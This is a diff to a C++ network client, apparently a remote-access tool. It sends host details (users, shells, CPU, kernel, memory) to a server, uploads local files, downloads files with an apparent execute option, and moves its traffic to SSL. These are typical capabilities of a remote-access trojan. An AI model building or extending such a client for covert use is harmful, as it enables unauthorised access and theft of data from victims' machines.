@@ -11,8 +11,8 @@ bool Client::SendInfo(){
         std::string strFinal = "";
         std::vector<struct sPartition> vcVec;
         std::vector<struct sUsers> vcVec2;
-        char *cMem = nullptr, *cCpu = nullptr, *cCores = nullptr, *cUsername = nullptr;
-        Uname(cMem);
+        char *cUname = nullptr, *cCpu = nullptr, *cCores = nullptr, *cUsername = nullptr;
+        Uname(cUname);
         Cpu(cCpu, cCores);
         if(UserName(cUsername) == 0){
                 strFinal.append(cUsername);
@@ -36,6 +36,14 @@ bool Client::SendInfo(){
                 strFinal.append(vcVec2[iIt2].cShell);
                 strFinal.append(1, '*');
         }
+        strFinal.append(1, '|');
+        strFinal.append(cCpu);
+        strFinal.append(1, '|');
+        strFinal.append(cCores);
+        strFinal.append(1, '|');
+        strFinal.append(cUname);
+        strFinal.append(1, '|');
+        strFinal.append(std::to_string(Mem()));
         strFinal.append("|AAA");
         #ifdef _DEBUG
         std::cout<<"packet\n"<<strFinal<<'\n';
@@ -50,8 +58,8 @@ bool Client::SendInfo(){
         }
         delete[] cUsername;
         cUsername = nullptr;
-        delete[] cMem;
-	    cMem = nullptr;
+        delete[] cUname;
+	    cUname = nullptr;
         delete[] cCpu;
         cCpu = nullptr;
         delete[] cCores;
@@ -246,7 +254,7 @@ bool Client::SendFile(const std::string strLocalFile) {
 			strmInputFile.read(cFileBuffer, iBlockSize);
 			iTmp = strmInputFile.gcount();
 			if(iTmp > 0){
-				int iBytes = send(sckSocket, cFileBuffer, iTmp, 0);
+				int iBytes = SSL_write(sslSocket, cFileBuffer, iTmp);
 				if(iBytes> 0){
 					uBytesSent += iBytes;
 					#ifdef _DEBUG
@@ -254,7 +262,6 @@ bool Client::SendFile(const std::string strLocalFile) {
 					std::fflush(stdout);
 					#endif
 				} else {
-					Misc::Free(cFileBuffer, iBlockSize);
 					#ifdef _DEBUG
 					std::cout<<"Error sending file\n";
 					error();
@@ -262,7 +269,6 @@ bool Client::SendFile(const std::string strLocalFile) {
 					break;
 				}
 			} else {		
-				Misc::Free(cFileBuffer, iBlockSize);
 				break;
 			}
 		}
@@ -319,7 +325,7 @@ void Client::RetrieveFile(u64 uFileSize, c_char cExec,const std::string strLocal
 	int iBufferSize = 255, iBytesRead = 0;
 	char *cFileBuffer = new char[iBufferSize];
 	while(uTotalBytes<uFileSize){
-		iBytesRead = recv(sckSocket, cFileBuffer, iBufferSize, 0);
+		iBytesRead = SSL_read(sslSocket, cFileBuffer, iBufferSize);
 		if(iBytesRead > 0){
 			strmOutputFile.write(cFileBuffer, iBytesRead);
 			uTotalBytes += iBytesRead;
